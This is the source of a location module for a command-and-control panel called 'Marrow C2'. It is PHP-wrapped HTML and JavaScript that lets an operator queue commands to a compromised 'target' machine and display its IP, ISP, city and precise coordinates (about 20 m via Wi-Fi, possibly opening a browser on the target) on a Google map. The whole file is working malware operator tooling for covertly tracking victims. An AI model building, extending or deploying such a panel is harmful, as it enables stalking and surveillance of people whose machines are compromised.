<?php
// Marrow C2 - Location Module
// IP-based and browser-based geolocation
?>
<div id="loc-container" class="h-full flex flex-col bg-[#030712]">
    <!-- Toolbar -->
    <div class="h-12 bg-[#0a0f1a] border-b border-[#1e2433] flex items-center justify-between px-4">
        <div class="flex items-center gap-4">
            <span class="text-white font-medium">📍 Location</span>
            <span id="loc-type" class="text-xs px-2 py-0.5 bg-[#1a1f2e] rounded-lg text-gray-400">IP-Based</span>
            <span id="loc-accuracy" class="text-xs px-2 py-0.5 bg-[#1a1f2e] rounded-lg text-gray-400"></span>
        </div>
        <div class="flex items-center gap-2">
            <button onclick="LOC.refresh()"
                class="px-4 py-2 bg-[#1a1f2e] hover:bg-[#252b3d] text-gray-300 rounded-lg text-sm font-medium">
                🌐 IP Location (~1-5km)
            </button>
            <button onclick="LOC.refreshPrecise()"
                class="px-4 py-2 bg-[#10b981] hover:bg-[#0ea573] text-white rounded-lg text-sm font-medium">
                📡 Precise Location (~20m)
            </button>
        </div>
    </div>

    <!-- Main Content -->
    <div class="flex-1 flex overflow-hidden">
        <!-- Map -->
        <div class="flex-1 relative">
            <iframe id="loc-map" class="w-full h-full border-0" src="about:blank"></iframe>
            <div id="loc-placeholder" class="absolute inset-0 flex items-center justify-center bg-[#030712]">
                <div class="text-center">
                    <div class="text-6xl mb-4 opacity-30">🌍</div>
                    <p class="text-gray-500 mb-4">Click "Get Location" to retrieve target location</p>
                    <p class="text-xs text-gray-600">Location is based on target's public IP address</p>
                </div>
            </div>
        </div>

        <!-- Info Panel -->
        <div class="w-80 bg-[#0a0f1a] border-l border-[#1e2433] p-4 space-y-4 overflow-auto">
            <h3 class="text-white font-medium">Location Details</h3>

            <div class="space-y-3">
                <div class="bg-[#0f1219] border border-[#1e2433] rounded-xl p-4">
                    <div class="text-[10px] text-gray-500 uppercase tracking-wider mb-1">Coordinates</div>
                    <div id="loc-coords" class="font-mono text-[#10b981] text-lg">--, --</div>
                </div>

                <div class="bg-[#0f1219] border border-[#1e2433] rounded-xl p-4">
                    <div class="text-[10px] text-gray-500 uppercase tracking-wider mb-1">City / Region</div>
                    <div id="loc-city" class="text-white">--</div>
                </div>

                <div class="bg-[#0f1219] border border-[#1e2433] rounded-xl p-4">
                    <div class="text-[10px] text-gray-500 uppercase tracking-wider mb-1">Country</div>
                    <div id="loc-country" class="text-white">--</div>
                </div>

                <div class="bg-[#0f1219] border border-[#1e2433] rounded-xl p-4">
                    <div class="text-[10px] text-gray-500 uppercase tracking-wider mb-1">ISP</div>
                    <div id="loc-isp" class="text-gray-400 text-sm">--</div>
                </div>

                <div class="bg-[#0f1219] border border-[#1e2433] rounded-xl p-4">
                    <div class="text-[10px] text-gray-500 uppercase tracking-wider mb-1">IP Address</div>
                    <div id="loc-ip" class="font-mono text-gray-400">--</div>
                </div>
            </div>

            <div class="space-y-2 pt-4">
                <button onclick="LOC.openMaps()"
                    class="w-full py-3 bg-[#6366f1]/10 hover:bg-[#6366f1]/20 border border-[#6366f1]/30 text-[#6366f1] rounded-xl font-medium text-sm">
                    🗺️ Open in Google Maps
                </button>
                <button onclick="LOC.copy()"
                    class="w-full py-3 bg-[#1a1f2e] hover:bg-[#252b3d] text-gray-300 rounded-xl text-sm">
                    📋 Copy Coordinates
                </button>
            </div>
        </div>
    </div>
</div>

<script>
    const LOC = {
        lat: null,
        lon: null,

        refresh() {
            document.getElementById('loc-placeholder').innerHTML = '<div class="animate-spin text-5xl">⏳</div><p class="text-gray-400 mt-4">Getting IP location...</p>';
            document.getElementById('loc-type').textContent = 'IP-Based';
            queueCommand('location');
        },

        refreshPrecise() {
            document.getElementById('loc-placeholder').innerHTML = '<div class="animate-spin text-5xl">📡</div><p class="text-gray-400 mt-4">Getting precise location via Wi-Fi...</p><p class="text-xs text-gray-600 mt-2">This may open a browser window on target</p>';
            document.getElementById('loc-type').textContent = 'Browser/WiFi';
            queueCommand('location_geo');
        },

        render(data) {
            try {
                const info = JSON.parse(data);

                if (info.error) {
                    document.getElementById('loc-placeholder').innerHTML = `<div class="text-red-400">❌ ${info.error}</div>`;
                    return;
                }

                this.lat = info.lat;
                this.lon = info.lon;

                document.getElementById('loc-coords').textContent = `${this.lat?.toFixed(6) || '--'}, ${this.lon?.toFixed(6) || '--'}`;
                document.getElementById('loc-city').textContent = `${info.city || '--'}, ${info.region || '--'}`;
                document.getElementById('loc-country').textContent = info.country || '--';
                document.getElementById('loc-isp').textContent = info.isp || '--';
                document.getElementById('loc-ip').textContent = info.ip || '--';
                
                // Show accuracy if available
                const accEl = document.getElementById('loc-accuracy');
                if (info.accuracy) {
                    accEl.textContent = `± ${info.accuracy}`;
                    accEl.style.display = '';
                } else {
                    accEl.style.display = 'none';
                }
                
                // Update type badge
                document.getElementById('loc-type').textContent = info.type === 'browser' ? 'Browser/WiFi' : 'IP-Based';
                document.getElementById('loc-type').className = info.type === 'browser' 
                    ? 'text-xs px-2 py-0.5 bg-[#10b981]/20 rounded-lg text-[#10b981]'
                    : 'text-xs px-2 py-0.5 bg-[#1a1f2e] rounded-lg text-gray-400';

                // Show map
                document.getElementById('loc-placeholder').style.display = 'none';
                document.getElementById('loc-map').src = `https://www.google.com/maps/embed?pb=!1m14!1m12!1m3!1d50000!2d${this.lon}!3d${this.lat}!2m3!1f0!2f0!3f0!3m2!1i1024!2i768!4f13.1!5e0`;

            } catch (e) {
                console.error(e);
            }
        },

        openMaps() {
            if (this.lat && this.lon) {
                window.open(`https://www.google.com/maps?q=${this.lat},${this.lon}`, '_blank');
            }
        },

        copy() {
            if (this.lat && this.lon) {
                navigator.clipboard.writeText(`${this.lat}, ${this.lon}`);
            }
        }
    };
</script>